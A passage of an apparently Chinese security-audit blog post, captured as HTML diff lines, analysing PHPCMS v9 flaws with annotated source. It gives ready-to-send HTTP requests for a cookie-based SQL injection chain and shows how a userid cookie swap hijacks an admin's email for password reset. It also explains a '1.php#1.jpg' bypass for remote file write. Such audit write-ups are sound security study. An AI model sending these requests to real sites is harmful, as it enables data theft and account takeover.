class="hljs-string">&#x27;cookie_path&#x27;</span>), pc_base::load_config(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;cookie_domain&#x27;</span>), <span class="hljs-variable">$s</span>);<br>          &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          setcookie(<span class="hljs-variable">$var</span>, sys_auth(<span class="hljs-variable">$value</span>, <span class="hljs-string">&#x27;ENCODE&#x27;</span>), <span class="hljs-variable">$time</span>, pc_base::load_config(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;cookie_path&#x27;</span>), pc_base::load_config(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;cookie_domain&#x27;</span>), <span class="hljs-variable">$s</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>下面继续寻找 set_cookie() 的可控利用</p>
+<blockquote>
+<p>phpcms/modules/attachment/attachments.php</p>
+</blockquote>
+<ul>
+<li>attachments 类的 swfupload_json() 方法具有可控的 set_cookie() ，但 attachments 类的构造方法中有一个登录验证，验证条件是具有一个可sys_auth()解密值，其实可以在 phpcms/modules/wap/index.php 中获取到这样的值绕过登录，该文件的代码这里就不研究了</li>
+<li><code>set_cookie($var, $value, $time)</code> 的 <code>$value</code> 在 <code>upload_json()</code> 中为 <code>$json_str</code>，通过 <code>$_GET[&#39;src&#39;]</code> 可控</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">attachments</span> </span>&#123;<br>  	<span class="hljs-keyword">private</span> <span class="hljs-variable">$att_db</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        pc_base::load_app_func(<span class="hljs-string">&#x27;global&#x27;</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;userid = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;userid&#x27;</span>] ? <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;userid&#x27;</span>] : (param::get_cookie(<span class="hljs-string">&#x27;_userid&#x27;</span>) ? param::get_cookie(<span class="hljs-string">&#x27;_userid&#x27;</span>) : sys_auth(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;userid_flash&#x27;</span>],<span class="hljs-string">&#x27;DECODE&#x27;</span>));<br>        <span class="hljs-comment">//判断是否登录</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;userid))&#123;<br>          showmessage(L(<span class="hljs-string">&#x27;please_login&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;member&#x27;</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swfupload_json</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>] = intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]);<br>        <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;src&#x27;</span>] = safe_replace(trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]));<br>        <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] = urlencode(safe_replace(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]));<br>        <span class="hljs-variable">$json_str</span> = json_encode(<span class="hljs-variable">$arr</span>);<br>        <span class="hljs-variable">$att_arr_exist</span> = param::get_cookie(<span class="hljs-string">&#x27;att_json&#x27;</span>);<br>        <span class="hljs-variable">$att_arr_exist_tmp</span> = explode(<span class="hljs-string">&#x27;||&#x27;</span>, <span class="hljs-variable">$att_arr_exist</span>);<br>        <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$att_arr_exist_tmp</span>) &amp;&amp; in_array(<span class="hljs-variable">$json_str</span>, <span class="hljs-variable">$att_arr_exist_tmp</span>)) &#123;<br>          	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$json_str</span> = <span class="hljs-variable">$att_arr_exist</span> ? <span class="hljs-variable">$att_arr_exist</span>.<span class="hljs-string">&#x27;||&#x27;</span>.<span class="hljs-variable">$json_str</span> : <span class="hljs-variable">$json_str</span>;<br>            param::set_cookie(<span class="hljs-string">&#x27;att_json&#x27;</span>,<span class="hljs-variable">$json_str</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>注意<code>$_GET[&#39;src&#39;]</code>会经过 <code>safe_replace()</code> 过滤，这里过滤时一次性的，也很好绕过</p>
+<img src="img/phpcms/image-20210816123309263.png" srcset="/img/loading.gif" lazyload alt="image-20210816123309263" style="zoom:50%;" />
+
+<p>通过上面的分析可能会有点绕，但大体清楚了我们其实可以在前台获取到加密的payload，下面将来正向利用一下</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>为了梳理逻辑，先画一下流程图</p>
+<img src="img/phpcms/1.png" srcset="/img/loading.gif" lazyload alt="1" style="zoom:80%;" />
+
+<p>1）获取用户认证id</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">GET /<span class="hljs-meta">index</span>.php?m=wap<span class="hljs-variable">&amp;c</span>=<span class="hljs-meta">index</span><span class="hljs-variable">&amp;a</span>=init<span class="hljs-variable">&amp;siteid</span>=1 <br></code></pre></td></tr></table></figure>
+
+<p>发送poc后，可以在cookie中获取一个<code>sys_auth()</code>加密的siteid值</p>
+<img src="img/phpcms/image-20210816145114580.png" srcset="/img/loading.gif" lazyload alt="image-20210816145114580" style="zoom:50%;" />
+
+<p>2）获取加密payload</p>
+<p>构造payload的过程十分关键，考虑的条件比较多，需要十分细心，这里还有以下几个要点要注意下</p>
+<ul>
+<li>我们要使用 <code>&amp;</code> 等符号构造payload，因为parse_str()通过 <code>&amp;</code> 来解析变量，在url中要对特殊符号编码</li>
+<li>这里对单引号做了url编码为<code>%*27</code>，目的是绕过全局addslashs()过滤，这里记录一个知识点，==parse_str()在解析字符串时会自动url解码==，所以<code>%*27</code>被safe_replace()过滤为<code>%27</code>，在parse_str()中最终解析为单引号 <code>&#39;</code>注入到数据库从而引发sql注入</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3D%*27%20and%20updatexml(1%2Cconcat(1%2C(user()))%2C1)%23%26m%3D1%26modelid%3D2%26f%3D3%26catid%3D4</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="apache"><span class="hljs-attribute">userid_flash</span>=b<span class="hljs-number">899</span>lJoDFE<span class="hljs-number">29</span>t<span class="hljs-number">7</span>SOemtSwDaOZMoD<span class="hljs-number">2</span>Fbr-Le<span class="hljs-number">6</span>AHJK</span><br></code></pre></td></tr></table></figure>
+
+<img src="img/phpcms/image-20210816152241887.png" srcset="/img/loading.gif" lazyload alt="image-20210816152241887" style="zoom:50%;" />
+
+<p>3）发送payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=f28d6EbHk-z-GPWT_BO5vtYwicatFNGnKrJe4afAjmGAjLx3h8HJi1-MHOO4fSjZXfg4mTiE8AQphhuGMbY85caXo5r3We6E0Izb52GXqr3LBgfQvqeHYcaPoEMWGai0osZ5HkS1dYZ94aQx2bnf32D8isXRc6_6fOgptzngztLPpXu6lQ</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure>
+
+<img src="img/phpcms/image-20210816153023365.png" srcset="/img/loading.gif" lazyload alt="image-20210816153023365" style="zoom:50%;" />
+
+<h2 id="任意邮箱修改"><a href="#任意邮箱修改" class="headerlink" title="任意邮箱修改"></a>任意邮箱修改</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yangxiaodi/p/6890298.html">https://www.cnblogs.com/yangxiaodi/p/6890298.html</a> 这个漏洞应该是误判，忽略了身份验证的代码。不过mysql中字符串数据转整数数据的知识点还是值得学习学习</p>
+<p>这相当于一个逻辑漏洞，在审计这种漏洞时，需要对程序的逻辑十分清楚，我习惯画一个流程图来梳理逻辑</p>
+<blockquote>
+<p>phpcms/modules/member/index.php</p>
+</blockquote>
+<ul>
+<li><p><code>$_username</code>、<code>$_userid</code> 、<code>$ssouid</code> 来自于get_cookie()，这一个获取并解密cookie值的函数，如果要控制这几个参数，我们需要能获取对应的加密值</p>
+</li>
+<li><p>然后会进入 <strong>send_newmail()</strong> 中唯一关键的身份认证，验证userid和username是否匹配，我看有人挖到的漏洞没有这几行代码。从而造成漏洞。但这几行代码存在的话将，我认为漏洞也就很难利用了。如果想通过认证，必须要知道userid和username的对应关系，然后需要知道指定的userid和username加密值。这两个条件似乎都不太好搞。下面是认为这几行代码不存时产生的漏洞</p>
+</li>
+<li><p><code>$neweamil</code> 代码要修改的新邮箱，可控。会经过 <strong>ps_checkemail()</strong> 方法检测 <code>$neweamil</code> 在数据库member表中的情况，如果<code>$neweamil</code> 在member表中不存在，则**ps_checkemail()<strong>返回1，代表这个新邮箱可用；如果 <code>$neweamil</code> 在member表中存在，则</strong>ps_checkemail()**返回-1，代表新邮箱地址被占用，需要进一步判断</p>
+</li>
+<li><p><code>$neweamil</code> 通过验证后，就会进入修改用户邮箱的环节，前提是sendmail()发送邮箱成功，本地测试为了方便没有配置邮箱，而是修改了程序代码，保证代码正常执行</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">send_newmail</span>(<span class="hljs-params"></span>) </span>&#123;<br>  	<span class="hljs-variable">$_username</span> = param::get_cookie(<span class="hljs-string">&#x27;_regusername&#x27;</span>);<br>		<span class="hljs-variable">$_userid</span> = param::get_cookie(<span class="hljs-string">&#x27;_reguserid&#x27;</span>);<br>		<span class="hljs-variable">$_ssouid</span> = param::get_cookie(<span class="hljs-string">&#x27;_reguseruid&#x27;</span>);<br>		<span class="hljs-variable">$newemail</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;newemail&#x27;</span>];<br>  	<br>  	<span class="hljs-comment">//验证userid和username是否匹配</span><br>		<span class="hljs-variable">$r</span> = <span class="hljs-keyword">$this</span>-&gt;db-&gt;get_one(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;userid&#x27;</span>=&gt;intval(<span class="hljs-variable">$_userid</span>)));<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span>[username]!=<span class="hljs-variable">$_username</span>)&#123;<br>			<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;2&#x27;</span>;<br>		&#125;<br>  	<br>  	<span class="hljs-comment">// 检测$newmail是否为唯一的新的邮箱</span><br>  	<span class="hljs-keyword">$this</span>-&gt;_init_phpsso();<br>		<span class="hljs-variable">$status</span> = <span class="hljs-keyword">$this</span>-&gt;client-&gt;ps_checkemail(<span class="hljs-variable">$newemail</span>);<br>  <br>  	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$status</span>==-<span class="hljs-number">1</span>) &#123;&#125;<br>  <br>  	<span class="hljs-keyword">if</span>(sendmail(<span class="hljs-variable">$newemail</span>, L(<span class="hljs-string">&#x27;reg_verify_email&#x27;</span>), <span class="hljs-variable">$message</span>))&#123;<br>			<span class="hljs-comment">//更新新的邮箱，用来验证</span><br> 			<span class="hljs-keyword">$this</span>-&gt;db-&gt;update(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;email&#x27;</span>=&gt;<span class="hljs-variable">$newemail</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;userid&#x27;</span>=&gt;<span class="hljs-variable">$_userid</span>));<br>			<span class="hljs-keyword">$this</span>-&gt;client-&gt;ps_member_edit(<span class="hljs-variable">$_username</span>, <span class="hljs-variable">$newemail</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_ssouid</span>);<br>			<span class="hljs-variable">$return</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>		&#125;<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-variable">$return</span> = <span class="hljs-string">&#x27;2&#x27;</span>;<br>		&#125;<br></code></pre></td></tr></table></figure>
+
+<p>漏洞利用：</p>
+<p>1）注册一个名为 <code>1jelly</code> 的用户</p>
+<p>在cookie中获取到加密值</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cIFPl__username</span>=<span class="hljs-number">8</span>d<span class="hljs-number">00</span>IEf<span class="hljs-number">52</span>ee<span class="hljs-number">17</span>nwPcUSvKfVhc<span class="hljs-number">9</span>OxLqdNZ<span class="hljs-number">7</span>n<span class="hljs-number">0</span>kpGFuSEMRSE;<br><span class="hljs-attribute">cIFPl__userid</span>=<span class="hljs-number">5</span>caaEyjeO_LOuhAb<span class="hljs-number">7</span>YF<span class="hljs-number">4</span>_<span class="hljs-number">7</span>-fexyHawM<span class="hljs-number">0</span>lvENOK<span class="hljs-number">2</span>W; <br></code></pre></td></tr></table></figure>
+
+<p>2）把username的加密值放到cookie中作为userid发送</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cIFPl__userid</span>=<span class="hljs-number">8</span>d<span class="hljs-number">00</span>IEf<span class="hljs-number">52</span>ee<span class="hljs-number">17</span>nwPcUSvKfVhc<span class="hljs-number">9</span>OxLqdNZ<span class="hljs-number">7</span>n<span class="hljs-number">0</span>kpGFuSEMRSE<br></code></pre></td></tr></table></figure>
+
+<p>这样userid在解密时值为 1jelly，最后执行的sql语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">UPDATE `phpcmsv9`.`v9_member` <span class="hljs-keyword">SET</span> `email`<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test1@qq.com&#x27;</span> <span class="hljs-keyword">WHERE</span>  `userid` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1jelly&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里也有一个小知识点，虽然userid在数据库中是1jelly，但mysql会自动转换1jellly为整数1，这样userid为1的用户邮箱就被获取了，在phpcms可以通过邮箱修改密码，这个漏洞最终将导致任意密码修改</p>
+<h2 id="任意文件写入漏洞"><a href="#任意文件写入漏洞" class="headerlink" title="任意文件写入漏洞"></a>任意文件写入漏洞</h2><blockquote>
+<p>phpcms/modules/member/index.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"></span>) </span>&#123;<br>  	<span class="hljs-comment">//加载用户模块配置,$member_setting[&#x27;choosemodel&#x27;]=1</span><br>		<span class="hljs-variable">$member_setting</span> = getcache(<span class="hljs-string">&#x27;member_setting&#x27;</span>);<br>  	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;dosubmit&#x27;</span>])) &#123;<br>      	<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;modelid&#x27;</span>] = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;modelid&#x27;</span>]) ? intval(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;modelid&#x27;</span>]) : <span class="hljs-number">10</span>;<br>      	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$member_setting</span>[<span class="hljs-string">&#x27;choosemodel&#x27;</span>]) &#123;<br>						<span class="hljs-variable">$member_input</span> = <span class="hljs-keyword">new</span> member_input(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;modelid&#x27;</span>]);<br>						<span class="hljs-variable">$user_model_info</span> = <span class="hljs-variable">$member_input</span>-&gt;get(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;info&#x27;</span>]);				        				<br>				&#125;<br>   	……<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>caches/caches_model/caches_data/member_input.class.php</p>
+</blockquote>
+<p>get()方法中有一个通过 $func() 调用类中的其他方法，而 $func 最终来自 <code>model_field_$_POST[&#39;modelid&#39;].cache.php</code> 中 <code>$field[&#39;formtype&#39;]</code>，翻了一下对应文件，包含了当前类的所有方法，所以通过get()方法可以调用当前类的任意方法</p>
+<p>而 member_input 类中就 editor() 方法可以利用，其中又调用了download() 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">member_input</span> </span>&#123;<br>  	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$modelid</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;db = pc_base::load_model(<span class="hljs-string">&#x27;sitemodel_field_model&#x27;</span>);<br>      	<span class="hljs-comment">//来源：caches/caches_model/caches_data/model_field_$modelid.cache.php，$modelid==$_POST[&#x27;modelid&#x27;]</span><br>        <span class="hljs-keyword">$this</span>-&gt;fields = getcache(<span class="hljs-string">&#x27;model_field_&#x27;</span>.<span class="hljs-variable">$modelid</span>,<span class="hljs-string">&#x27;model&#x27;</span>);<br>        pc_base::load_sys_class(<span class="hljs-string">&#x27;attachment&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;attachment = <span class="hljs-keyword">new</span> attachment(<span class="hljs-string">&#x27;content&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;siteid);<br>    &#125;<br>		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    		<span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$field</span>=&gt;<span class="hljs-variable">$value</span>) &#123;<br>            		<span class="hljs-variable">$func</span> = <span class="hljs-keyword">$this</span>-&gt;fields[<span class="hljs-variable">$field</span>][<span class="hljs-string">&#x27;formtype&#x27;</span>];<br>              	<span class="hljs-comment">// $func 为当前类的方法，则可以执行</span><br>            		<span class="hljs-keyword">if</span>(method_exists(<span class="hljs-keyword">$this</span>, <span class="hljs-variable">$func</span>)) <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$func</span>(<span class="hljs-variable">$field</span>, <span class="hljs-variable">$value</span>);<br>								<span class="hljs-variable">$info</span>[<span class="hljs-variable">$field</span>] = <span class="hljs-variable">$value</span>;<br>            &#125;<br>        &#125;<br>      	<span class="hljs-keyword">return</span> <span class="hljs-variable">$info</span>;<br>    &#125;<br>  	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editor</span>(<span class="hljs-params"><span class="hljs-variable">$field</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable">$setting</span> = string2array(<span class="hljs-keyword">$this</span>-&gt;fields[<span class="hljs-variable">$field</span>][<span class="hljs-string">&#x27;setting&#x27;</span>]);<br>        <span class="hljs-variable">$enablesaveimage</span> = <span class="hljs-variable">$setting</span>[<span class="hljs-string">&#x27;enablesaveimage&#x27;</span>];<br>        <span class="hljs-variable">$site_setting</span> = string2array(<span class="hljs-keyword">$this</span>-&gt;site_config[<span class="hljs-string">&#x27;setting&#x27;</span>]);<br>        <span class="hljs-variable">$watermark_enable</span> = intval(<span class="hljs-variable">$site_setting</span>[<span class="hljs-string">&#x27;watermark_enable&#x27;</span>]);<br>        <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;attachment-&gt;download(<span class="hljs-string">&#x27;content&#x27;</span>, <span class="hljs-variable">$value</span>,<span class="hljs-variable">$watermark_enable</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>		&#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进 download() 代码</p>
+<blockquote>
+<p>phpcms/libs/classes/attachment.class.php</p>
+</blockquote>
+<ul>
+<li>attachment 类在实例化<code>__construct()</code> 时已经确定了 upload_func = ‘copy’ ，在后面通过 $upload_func 就会调用 copy() 方法，是文件写入地方。但在写入前，还有一大堆处理需要分析</li>
+<li>传入 download() 的 $fidld=’content’，$value为用户post数据，可控</li>
+<li>download() 通过正则表达式等限制了 $value 必须为 .jpg 这样的后缀，这样我们写入的文件就没有危害了</li>
+<li>但后面存在一个 fillurl() 会帮我们格式化正则匹配的连接，如去掉#号后面的内容，这样我们便可以通过如：1.php#1.jpg的方式绕过前面正则的限制</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">attachment</span> </span>&#123;<br>  	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$module</span>=<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$catid</span> = <span class="hljs-number">0</span>,<span class="hljs-variable">$siteid</span> = <span class="hljs-number">0</span>,<span class="hljs-variable">$upload_dir</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;upload_root = pc_base::load_config(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;upload_path&#x27;</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;upload_func = <span class="hljs-string">&#x27;copy&#x27;</span>;<br>		&#125;<br>  	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span>(<span class="hljs-params"><span class="hljs-variable">$field</span>, <span class="hljs-variable">$value</span>,<span class="hljs-variable">$watermark</span> = <span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-variable">$ext</span> = <span class="hljs-string">&#x27;gif|jpg|jpeg|bmp|png&#x27;</span>, <span class="hljs-variable">$absurl</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$basehref</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable">$string</span> = new_stripslashes(<span class="hljs-variable">$value</span>);<br>      	<span class="hljs-variable">$remotefileurls</span> = <span class="hljs-keyword">array</span>();<br>      	<span class="hljs-comment">// 正则匹配 $value ,有效示例：href=http://www.baidu.com/1.php#1.jpg</span><br>      	<span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&quot;/(href|src)=([\&quot;|&#x27;]?)([^ \&quot;&#x27;&gt;]+\.(<span class="hljs-subst">$ext</span>))\\2/i&quot;</span>, <span class="hljs-variable">$string</span>, <span class="hljs-variable">$matches</span>)) <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>        <span class="hljs-comment">// $matchesp[3] href跳转的连接，示例：http://www.baidu.com/1.php#1.jpg</span><br>      	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$matches</span>[<span class="hljs-number">3</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$matche</span>)<br>        &#123;<br>          	<span class="hljs-comment">// 必须有 :// ，表示为远程文件</span><br>            <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$matche</span>, <span class="hljs-string">&#x27;://&#x27;</span>) === <span class="hljs-literal">false</span>) <span class="hljs-keyword">continue</span>;<br>            dir_create(<span class="hljs-variable">$uploaddir</span>);<br>          	<span class="hljs-comment">// fillurl()会格式化url，去掉#后面的内容，从而使得我们能写入php后缀文件，示例：http://www.baidu.com/1.php</span><br>            <span class="hljs-variable">$remotefileurls</span>[<span class="hljs-variable">$matche</span>] = <span class="hljs-keyword">$this</span>-&gt;fillurl(<span class="hljs-variable">$matche</span>, <span class="hljs-variable">$absurl</span>, <span class="hljs-variable">$basehref</span>);<br>        &#125;<br>      	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$remotefileurls</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$file</span>) &#123;<br>          	<span class="hljs-comment">// 再次检测连接中有 ://</span><br>            <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;://&#x27;</span>) === <span class="hljs-literal">false</span> || strpos(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$upload_url</span>) !== <span class="hljs-literal">false</span>) <span class="hljs-keyword">continue</span>;<br>          	<span class="hljs-comment">// 获取文件后缀名 示例:php</span><br>            <span class="hljs-variable">$filename</span> = fileext(<span class="hljs-variable">$file</span>);<br>						<span class="hljs-comment">// 生成随机文件名</span><br>            <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getname(<span class="hljs-variable">$filename</span>);<br>            <span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$uploaddir</span>.<span class="hljs-variable">$filename</span>;<br>          	<span class="hljs-comment">// $upload_func=&#x27;copy&#x27;</span><br>            <span class="hljs-variable">$upload_func</span> = <span class="hljs-keyword">$this</span>-&gt;upload_func;<br>          	<span class="hljs-comment">// 最终 copy() 写入文件</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$upload_func</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$newfile</span>)) &#123;……&#125;<br>        &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span 